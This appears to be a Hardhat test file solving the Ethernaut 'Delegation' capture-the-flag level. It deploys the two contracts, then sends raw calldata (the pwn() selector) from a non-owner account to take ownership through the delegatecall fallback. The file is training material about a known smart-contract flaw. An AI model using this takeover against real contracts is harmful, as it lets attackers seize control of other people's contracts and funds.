import {
  time,
  loadFixture,
} from "@nomicfoundation/hardhat-toolbox/network-helpers";
import { anyValue } from "@nomicfoundation/hardhat-chai-matchers/withArgs";
import { expect } from "chai";
import { ethers } from "hardhat";

describe("Ethernaut Delegate", function () {
  async function deployMinimalProxyFixture() {
    // Contracts are deployed using the first signer/account by default
    const [owner, otherAccount] = await ethers.getSigners();

    const Delegate = await ethers.getContractFactory("Delegate");
    const delegate = await Delegate.deploy(owner);
    const delegateAddress = await delegate.getAddress();

    const Delegation = await ethers.getContractFactory("Delegation");
    const delegation = await Delegation.deploy(delegateAddress);

    return { delegation, owner, otherAccount };
  }

  describe("Deployment", function () {
    it("Should Transfer ownership in delegation contract", async function () {
      const { delegation, owner, otherAccount } = await loadFixture(
        deployMinimalProxyFixture
      );

      await otherAccount.sendTransaction({
        to: delegation.getAddress(),
        data: "0xdd365b8b",
      });

      expect(await delegation.owner()).to.be.equal(otherAccount.address);
    });
  });
});
